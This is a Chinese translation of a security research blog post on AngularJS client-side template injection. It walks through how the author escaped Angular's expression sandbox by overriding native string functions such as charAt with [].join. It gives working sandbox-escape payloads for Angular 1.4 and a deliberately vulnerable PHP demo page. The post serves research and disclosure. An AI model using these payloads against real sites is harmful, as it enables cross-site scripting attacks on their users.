# XSS without HTML: Client-Side Template Injection with AngularJS（无 HTML 的 XSS：使用 AngularJS 的客户端模板注入）

> 作者：**Gareth Heyes**（研究员）  
> Twitter：[@garethheyes](https://twitter.com/garethheyes)

- **发布时间：** 2016 年 1 月 27 日（星期三）10:39 UTC
- **更新日期：** 2025 年 12 月 17 日（星期三）15:21 UTC

### 摘要

对极为流行的 JavaScript 框架 [AngularJS](https://angularjs.org/) 的简单使用正在使大量网站暴露于 Angular 模板注入。这种相对低调的[服务器端模板注入](/blog/server-side-template-injection)的孪生兄弟，可以与 Angular 沙箱逃逸相结合，在原本安全的网站上发起[跨站脚本](/web-security/cross-site-scripting)（[XSS](/web-security/cross-site-scripting)）攻击。到目前为止，还没有公开已知的影响 Angular 1.3.1+ 和 1.4.0+ 的沙箱逃逸。本文将总结 Angular 模板注入的核心概念，然后展示一种新的沙箱逃逸的开发过程，该逃逸影响所有现代 Angular 版本。

### 引言

[AngularJS](/web-security/cross-site-scripting/contexts/client-side-template-injection) 是由 Google 编写的 MVC 客户端框架。使用 Angular 时，您通过查看源代码或 Burp 看到的包含 `ng-app` 的 HTML 页面实际上是模板，并由 Angular 渲染。这意味着，如果用户输入被直接嵌入到页面中，应用程序可能容易受到客户端模板注入攻击。即使输入被 HTML 编码并位于属性内，也是如此。

Angular 模板可以包含[表达式](https://docs.angularjs.org/guide/expression)——双花括号内的类似 JavaScript 的代码片段。要了解它们的工作原理，请查看以下 jsfiddle：

[http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/)

文本输入 `{{1+1}}` 被 Angular 求值，然后显示输出：2。

这意味着任何能够注入双花括号的人都可以执行 Angular 表达式。Angular 表达式本身没有太大危害，但结合沙箱逃逸，我们可以执行任意 JavaScript 并造成严重破坏。

以下两个代码片段展示了该漏洞的本质。第一个页面动态嵌入用户输入，但由于使用了 `htmlspecialchars` 对输入进行 HTML 编码，因此不易受到 XSS 攻击：

```html
<html>
<body>
<p>
<?php
$q = $_GET['q'];
echo htmlspecialchars($q, ENT_QUOTES);
?>
</p>
</body>
</html>
```

第二个页面几乎相同，但引入了 Angular，因此可以通过注入 Angular 表达式来利用，配合沙箱逃逸实现 XSS：

```html
<html ng-app>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js"></script>
</head>
<body>
<p>
<?php
$q = $_GET['q'];
echo htmlspecialchars($q, ENT_QUOTES);
?>
</p>
</body>
</html>
```

注意，您需要在 DOM 树中表达式的上方有 `ng-app`。通常 Angular 站点会在根 HTML 或 body 标签中使用它。

换句话说，如果页面是 Angular 模板，我们发起 XSS 攻击就会容易得多。唯一的问题就是沙箱。幸运的是，有解决方案。

### 沙箱

Angular 表达式被沙箱化，以“保持应用程序职责的正确分离”。为了利用用户，我们需要突破沙箱并执行任意 JavaScript。

让我们重用之前的 fiddle，在 Chrome 的 Sources 选项卡中在 `angular.js` 的第 13275 行设置[断点](https://developers.google.com/web/tools/chrome-devtools/javascript/breakpoints)。在监视窗口中，添加一个新的监视表达式 `fnString`。这将显示我们转换后的输出。`1+1` 被转换为：

```javascript
"use strict";
var fn = function(s, l, a, i) {
    return plus(1, 1);
};
return fn;
```

所以表达式被解析并重写，然后由 Angular 执行。让我们尝试获取 Function 构造器：

[http://jsfiddle.net/2zs2yv7o/1/](http://jsfiddle.net/2zs2yv7o/1/)

这里变得更有趣了，以下是重写后的输出：

```javascript
"use strict";
var fn = function(s, l, a, i) {
    var v0, v1, v2, v3, v4 = l && ('constructor' in l),
        v5; // 此处仅对 v4 进行赋值，其余变量仅声明

    // v3 获取构造器
    if (!(v4)) {
        if (s) {
            v3 = s.constructor;
        }
    } else {
        v3 = l.constructor;
    }

    // 检查 v3 的对象是否安全
    ensureSafeObject(v3, text);
    if (v3 != null) {
        // 检查 v3 的构造器，并设置 v2
        v2 = ensureSafeObject(v3.constructor, text);
    } else {
        v2 = undefined;
    }

    // 若 v2 存在，则继续检查 v2 是否函数安全
    if (v2 != null) {
        ensureSafeFunction(v2, text);
        v5 = 'alert\u00281\u0029'; // v5 = 'alert(1)' Unicode 编码括号
        ensureSafeObject(v3, text);
        v1 = ensureSafeObject(v3.constructor(ensureSafeObject('alert\u00281\u0029', text)), text); // 检查 `alert(1)` 的对象安全后，使用 v3 的构造器创建新函数
    } else {
        v1 = undefined;
    }
    if (v1 != null) {
        // 检查 v1 的函数安全，之后后赋值到 v0
        ensureSafeFunction(v1, text);
        v0 = ensureSafeObject(v1(), text);
    } else {
        v0 = undefined;
    }
    // 返回最终结果 v0
    return v0;
};
return fn;
```

如您所见，Angular 依次遍历每个对象，并使用 `ensureSafeObject` 函数进行检查。[ensureSafeObject 函数](https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L60-L85) 检查对象是否为 Function 构造器、window 对象、DOM 元素或 Object 构造器。如果任何检查为真，它将引发异常并停止执行表达式。它还通过使全局变量的所有引用都指向对象属性来阻止访问全局变量。

Angular 还有其他几个执行安全检查的函数，如 [ensureSafeMemberName](https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L40-L58) 和 [ensureSafeFunction](https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L91-L103)。`ensureSafeMemberName` 检查 JavaScript 属性并确保其不匹配 `__proto__` 等，`ensureSafeFunction` 检查函数调用不调用 Function 构造器或 `call`、`apply` 和 `bind`。

### 破坏消毒器

Angular 消毒器是一个用 JavaScript 编写的客户端过滤器，它扩展 Angular 以安全地允许使用名为 `ng-bind-html` 的属性进行 HTML 绑定，该属性包含要过滤的引用。然后它获取输入并在不可见的 DOM 树中渲染，并对元素和属性应用白名单过滤。

当我在测试 [Angular 消毒器](https://github.com/angular/angular.js/pull/12524) 时，我考虑过使用 Angular 表达式覆盖原生 JavaScript 函数。问题是 Angular 表达式不支持函数语句或函数表达式，因此您无法用任何值覆盖该函数。思考了一段时间后，我想到了 `String.fromCharCode`。由于该函数是从 `String` 构造器调用的，而不是通过字符串字面量，`this` 值将是 `String` 构造器。也许我可以为 `fromCharCode` 函数开后门！

如何在不创建函数的情况下为 `fromCharCode` 函数开后门？简单：重用现有函数！问题是如何在每次调用 `fromCharCode` 时控制其值。如果我们使用 `Array` 的 `join` 函数，我们可以使 `String` 构造器成为一个伪数组。我们只需要一个 `length` 属性和一个 `0` 属性作为伪数组的第一个索引，幸运的是它已经有了 `length` 属性，因为它的参数长度为 1。我们只需要给它一个 `0` 属性。方法如下：

```javascript
'a'.constructor.fromCharCode = [].join;
'a'.constructor[0] = '\u003ciframe onload=alert(/Backdoored/)\u003e';
```
- `'a'.constructor.length` => `1` 

当调用 `String.fromCharCode` 时，您将得到字符串 `<iframe onload=alert(/Backdoored/)>`，而不是期望的值。这在 Angular 沙箱内完美运行。以下是 fiddle：

[http://jsfiddle.net/2zs2yv7o/2/](http://jsfiddle.net/2zs2yv7o/2/)

我继续审查 Angular 消毒器的代码，但没有找到任何导致绕过的 `String.fromCharCode` 调用（即，之前的构想无法实际应用）。我查看了其他原生函数，发现一个有趣的：`charCodeAt`。如果我能覆盖这个值，它将在不经过任何过滤的情况下被注入到属性中。但有一个问题：这次 `this` 值将是字符串字面量，而不是字符串构造器。这意味着我不能使用相同的技术来覆盖该函数，因为我无法操作索引或长度，因为字符串字面量的这些属性不可写。

然后我想到了 `[].concat`；使用此函数将原样返回字符串和参数，连接在一起。以下 fiddle 调用 `'abc'.charCodeAt(0)`，因此您期望输出为 '97'（ASCII a），但由于后门，它返回基础字符串加上参数（chrome 有效，firefox 无效）。

[http://jsfiddle.net/2zs2yv7o/3/](http://jsfiddle.net/2zs2yv7o/3/)

这导致消毒器被破坏，因为我可以注入恶意属性。消毒器代码如下：

```javascript
// 返回过滤后的名值对
if (validAttrs[lkey] === true && (uriAttrs[lkey] !== true || uriValidator(value, isImage))) {
  out(' ');
  out(key);
  out('="');
  out(encodeEntities(value));
  out('"');
}
```

`out` 返回过滤后的输出；`key` 指属性名；`value` 是属性值。以下是 `encodeEntities` 函数：

```javascript
function encodeEntities(value) {
  return value.
    replace(/&/g, '&amp;').
    replace(SURROGATE_PAIR_REGEXP, function(value) {
      var hi = value.charCodeAt(0);
      var low = value.charCodeAt(1);
      return '&#' + (((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000) + ';';
    }).
    replace(NON_ALPHANUMERIC_REGEXP, function(value) {
      return '&#' + value.charCodeAt(0) + ';';
    }).
  replace(/&lt;/g, '&lt;').
  replace(/&gt;/g, '&gt;');
}
```

粗体部分的代码是注入发生的地方，因此开发者显然期望 `charCodeAt` 函数返回一个整数。您可以通过防御性编码强制将值转换为整数，但如果攻击者可以覆盖原生函数，您可能已经失守了。这样就绕过了消毒器，使用类似的技术我们也可以突破沙箱。

### 逃逸沙箱

我查看了 Angular 源代码，寻找 `String.fromCharCode` 调用，并发现了一个[相当有趣](https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L262)的实例。在解析字符串字面量时，它们使用它来输出值。我想我可以为 `fromCharCode` 开后门并跳出解析的字符串。以下是 fiddle：

[http://jsfiddle.net/2zs2yv7o/4/](http://jsfiddle.net/2zs2yv7o/4/)

结果我能够为 Unicode 转义开后门，但无法跳出重写后的代码。

然后我想知道之前对消毒器使用的相同技术是否可以用不同的原生函数在这里起作用。我想使用 `charAt` 可以成功解析代码但返回完全不同的输出并绕过沙箱。我尝试注入它并检查重写的输出。

```javascript
{{
    'a'.constructor.prototype.charAt=[].join;
    $eval('x=""')+''
}}
```

[http://jsfiddle.net/2zs2yv7o/5/](http://jsfiddle.net/2zs2yv7o/5/)

控制台出现了一些有趣的结果，我得到了一个来自浏览器的 JavaScript 解析错误，而不是来自 Angular。我查看了重写后的代码，如下：

```javascript
"use strict";
var fn = function(s, l, a, i) {
    var v5, v6 = l && ('x\u003d\u0022\u0022' in l);
    if (!(v6)) {
        if (s) {
            v5 = s.x = "";
        }
    } else {
        v5 = l.x = "";
    }
    return v5;
};
fn.assign = function(s, v, l) {
    var v0, v1, v2, v3, v4 = l && ('x\u003d\u0022\u0022' in l);
    v3 = v4 ? l : s;
    if (!(v4)) {
        if (s) {
            v2 = s.x = "";
        }
    } else {
        v2 = l.x = "";
    }
    if (v3 != null) {
        v1 = v;
        ensureSafeObject(v3.x = "", text);
        v0 = v3.x = "" = v1;
    }
    return v0;
};
return fn;
```

上面的粗体部分是语法错误，如果重写后的代码产生了 JavaScript 语法错误，那就意味着我可以在重写的输出中注入我自己的代码！接下来我注入了以下代码：

```javascript
{{
    'a'.constructor.prototype.charAt=[].join;
    $eval('x=alert(1)')+''
}}
```

调试器停在第一次调用，我点击继续，然后带着满脸笑容去吃午饭了，因为即使不检查我也知道我攻破了沙箱，很可能覆盖了几乎所有版本。我吃完午饭回来点击继续，果然弹出了 alert 并破坏了沙箱。以下是 fiddle：

[http://jsfiddle.net/2zs2yv7o/6/](http://jsfiddle.net/2zs2yv7o/6/)

以下是重写后的代码：

```javascript
"use strict";
var fn = function(s, l, a, i) {
    var v5, v6 = l && ('x\u003dalert\u00281\u0029' in l);
    if (!(v6)) {
        if (s) {
            v5 = s.x = alert(1);
        }
    } else {
        v5 = l.x = alert(1);
    }
    return v5;
};
fn.assign = function(s, v, l) {
    var v0, v1, v2, v3, v4 = l && ('x\u003dalert\u00281\u0029' in l);
    v3 = v4 ? l : s;
    if (!(v4)) {
        if (s) {
            v2 = s.x = alert(1);
        }
    } else {
        v2 = l.x = alert(1);
    }
    if (v3 != null) {
        v1 = v;
        ensureSafeObject(v3.x = alert(1), text);
        v0 = v3.x = alert(1) = v1;
    }
    return v0;
};
return fn;
```

如您所见，重写后的代码包含了 alert。您可能注意到这在 Firefox 上不起作用。这是一个小挑战，尝试让它同时在 Firefox 和 Chrome 上工作。选择下面隐藏的文本以查看挑战的解决方案：

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

要深入了解 Angular 解析代码时发生了什么，请在 `angular.js` 的第 14079 行设置断点，点击一次“继续”以跳过初始解析，然后通过不断点击调试器中的“步入函数”来逐步执行代码。在这里您将能看到 Angular 错误地解析了代码。它会在第 12699 行认为 `x=alert(1)` 是一个标识符。代码假设它正在检查一个字符，但实际上它正在检查一个较长的字符串，因此它通过了测试。参见下文：

```javascript
isIdent = function(ch) {
    return ('a' <= ch && ch <= 'z' ||
            'A' <= ch && ch <= 'Z' ||
            '_' === ch || ch === '$');
}
isIdent('x9=9a9l9e9r9t9(919)')
```

该字符串已由我们覆盖的 `charAt` 函数生成，`9` 是传递的参数。由于代码的编写方式，它总是能通过测试，因为 `'a'`、`'z'` 等总是与较长字符串的第一个字符进行比较。幸运的是，在第 12701 行，原始字符串被用来生成标识符。然后在第 13247 行，当创建赋值函数时，该标识符会被多次注入到函数字符串中，当使用 Function 构造器调用时，会注入我们的 alert。

以下是最终载荷，针对 Angular 1.4 定制：

```javascript
{{
'a'.constructor.prototype.charAt=[].join;
$eval('x=1} } };alert(1)//');
}}
```

### 结论

如果您使用 Angular，您需要将用户输入中的花括号视为高度危险，或者完全避免在服务器端反射用户输入。大多数其他 JavaScript 框架通过不支持 HTML 文档中任意位置的表达式来规避此危险。

Google 肯定知道这个问题，但我们不确定它在更广泛的社区中有多知名，尽管已有[现有研究](http://www.slideshare.net/x00mario/jsmvcomfg-to-sternly-look-at-javascript-mvc-and-templating-frameworks)和[相关主题](https://code.google.com/p/mustache-security/)。[Angular 的文档](https://docs.angularjs.org/guide/security)确实建议不要在模板中动态嵌入用户输入，但也误导性地暗示 Angular 不会在原本安全的代码中引入任何 XSS 漏洞。这个问题甚至不限于客户端模板注入；Angular 模板注入可以（[并且已经](https://twitter.com/jayaradhashyam/status/640864269916094464)）在服务器端出现，并导致 RCE。

我认为这个问题之所以迄今为止未引起广泛关注，是因为缺乏针对最新 Angular 分支的已知沙箱逃逸。所以现在可能是考虑为 JavaScript 导入制定补丁管理策略的好时机。

此沙箱逃逸于 2015 年 9 月 25 日私下报告给 Google，并于 2016 年 1 月 15 日在 1.5.0 版本中修补。鉴于 AngularJS 沙箱绕过历史悠久的现状，以及 Angular 坚持沙箱“并非旨在阻止攻击者”的立场，我们不认为更新 Angular 是解决表达式注入的可靠方案。因此，我们发布了新的 [Burp Scanner](/burp/vulnerability-scanner) 检查来检测客户端模板注入，并在下面列出了最新的 Angular 沙箱逃逸列表。
